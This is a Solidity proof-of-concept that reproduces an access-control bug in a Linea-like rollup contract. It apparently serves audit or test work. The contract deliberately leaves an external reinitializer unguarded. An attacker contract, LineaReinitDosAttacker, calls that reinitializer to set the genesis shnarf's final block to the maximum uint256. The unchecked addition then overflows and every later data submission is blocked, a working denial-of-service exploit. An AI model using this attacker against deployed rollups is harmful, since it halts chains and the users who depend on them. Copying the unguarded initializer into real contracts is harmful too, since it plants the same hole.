// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface ILineaRollupLike {
    function initialize(uint256 initialL2BlockNumber, address operator_) external;
    function initializeParentShnarfsAndFinalizedState(bytes32[] calldata shnarfs, uint256[] calldata finalBlockNumbers) external;
    function submitData(bytes32 parentShnarf, uint256 firstBlockInData, uint256 finalBlockInData) external;
    function canSubmitData(bytes32 parentShnarf, uint256 firstBlockInData, uint256 finalBlockInData) external view returns (bool);
    function shnarfFinalBlockNumbers(bytes32 shnarf) external view returns (uint256);
    function currentL2BlockNumber() external view returns (uint256);
    function GENESIS_SHNARF() external view returns (bytes32);
}

/// @notice Minimal transparent proxy used for exploit parity.
contract LineaF1SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("linea.f1.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("linea.f1.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            sstore(adminSlot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            admin_ := sload(adminSlot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(implementationSlot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(implementationSlot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice Bug-parity model:
/// 1) normal initializer sets version=1
/// 2) external reinitializer(5) has no role guard
/// 3) submission validity depends on shnarfFinalBlockNumbers[parent] + 1
contract LineaRollupLike {
    bytes32 internal constant EMPTY_HASH = bytes32(0);
    bytes32 public constant GENESIS_SHNARF =
        keccak256(
            abi.encode(
                EMPTY_HASH,
                EMPTY_HASH,
                0x072ead6777750dc20232d1cee8dc9a395c2d350df4bbaa5096c6f59b214dcecd,
                EMPTY_HASH,
                EMPTY_HASH
            )
        );

    mapping(bytes32 shnarf => uint256 finalBlockNumber) public shnarfFinalBlockNumbers;
    uint256 public currentL2BlockNumber;
    bytes32 public currentFinalizedState;
    address public operator;

    uint8 internal initializedVersion;

    error AlreadyInitialized();
    error InvalidLengths();
    error Unauthorized();
    error InvalidSubmission();

    constructor() {
        _disableInitializers();
    }

    modifier initializer() {
        if (initializedVersion >= 1) revert AlreadyInitialized();
        initializedVersion = 1;
        _;
    }

    modifier reinitializer(uint8 version) {
        if (initializedVersion >= version) revert AlreadyInitialized();
        initializedVersion = version;
        _;
    }

    function _disableInitializers() internal {
        initializedVersion = type(uint8).max;
    }

    function initialize(uint256 initialL2BlockNumber, address operator_) external initializer {
        operator = operator_;
        currentL2BlockNumber = initialL2BlockNumber;
        shnarfFinalBlockNumbers[GENESIS_SHNARF] = initialL2BlockNumber;
        currentFinalizedState = keccak256(abi.encode(initialL2BlockNumber, operator_));
    }

    /// @notice Intentionally missing access control (bug parity with LineaRollup).
    function initializeParentShnarfsAndFinalizedState(
        bytes32[] calldata shnarfs,
        uint256[] calldata finalBlockNumbers
    ) external reinitializer(5) {
        if (shnarfs.length != finalBlockNumbers.length) revert InvalidLengths();
        for (uint256 i; i < shnarfs.length; i++) {
            shnarfFinalBlockNumbers[shnarfs[i]] = finalBlockNumbers[i];
        }
        currentFinalizedState = keccak256(abi.encode(currentL2BlockNumber));
    }

    function submitData(bytes32 parentShnarf, uint256 firstBlockInData, uint256 finalBlockInData) external {
        if (msg.sender != operator) revert Unauthorized();
        if (!_isValidSubmission(shnarfFinalBlockNumbers[parentShnarf], currentL2BlockNumber, firstBlockInData, finalBlockInData)) {
            revert InvalidSubmission();
        }
        currentL2BlockNumber = finalBlockInData;
    }

    function canSubmitData(
        bytes32 parentShnarf,
        uint256 firstBlockInData,
        uint256 finalBlockInData
    ) external view returns (bool) {
        return _isValidSubmission(shnarfFinalBlockNumbers[parentShnarf], currentL2BlockNumber, firstBlockInData, finalBlockInData);
    }

    function _isValidSubmission(
        uint256 parentFinalBlockNumber,
        uint256 lastFinalizedBlockNumber,
        uint256 firstBlockInData,
        uint256 finalBlockInData
    ) internal pure returns (bool) {
        unchecked {
            if (parentFinalBlockNumber + 1 != firstBlockInData) {
                return false;
            }
        }
        if (firstBlockInData <= lastFinalizedBlockNumber) {
            return false;
        }
        if (firstBlockInData > finalBlockInData) {
            return false;
        }
        return true;
    }
}

contract LineaReinitDosAttacker {
    function poisonGenesis(address proxy) external {
        bytes32[] memory shnarfs = new bytes32[](1);
        uint256[] memory blocks = new uint256[](1);
        shnarfs[0] = ILineaRollupLike(proxy).GENESIS_SHNARF();
        blocks[0] = type(uint256).max;
        ILineaRollupLike(proxy).initializeParentShnarfsAndFinalizedState(shnarfs, blocks);
    }
}

